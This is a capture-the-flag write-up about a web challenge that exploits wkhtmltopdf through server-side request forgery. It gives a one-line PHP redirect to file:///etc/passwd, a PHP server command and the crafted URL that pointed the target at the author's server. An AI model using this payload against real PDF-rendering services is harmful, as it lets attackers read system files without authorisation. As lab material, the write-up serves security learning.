So this challenge was the bane of my existence for quite a while. It took me longer than I’m willing to admit to get the flag. We start by opening the link given to us. On this splash page is a single image of an arcade machine and a text box. Any link we put in here will turn into a pdf that will be shown on the page. When a url that cannot be reached is put in, it gives us an error message about ‘wkhtmltopdf’. Looking up vulnerabilities for this, we find a web page that documents a three step process to getting this to exploit. Firstly, DO NOT USE PYTHON TO START A SERVER HERE. Instead of ‘python -m http.server 8080’, do ‘php -S 0.0.0.0:8000’. Python does not work in this instance. So to begin, looking at the webpage (https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/) that helped us with this, we need to create a file, set up a php server, and then send a request to ourselves through PDFy. The file we create will be called exploit.php, and will have one line: ‘<?php header('location:file:///etc/passwd'); ?>’. The server can be created with the aforementioned php server command. For the request we send to PHDy, we use simply use ‘http://209.94.57.74:8000/exploit.php?’. I know that the example website was having us pass a directory request into exploit.php, but I found this to be more trouble than it was worth and tailored my approach to be just for this one challenge. Once this url is pasted into the URL box on PDFy, the PDF of /etc/passwd will be shown, thus granting us our flag!
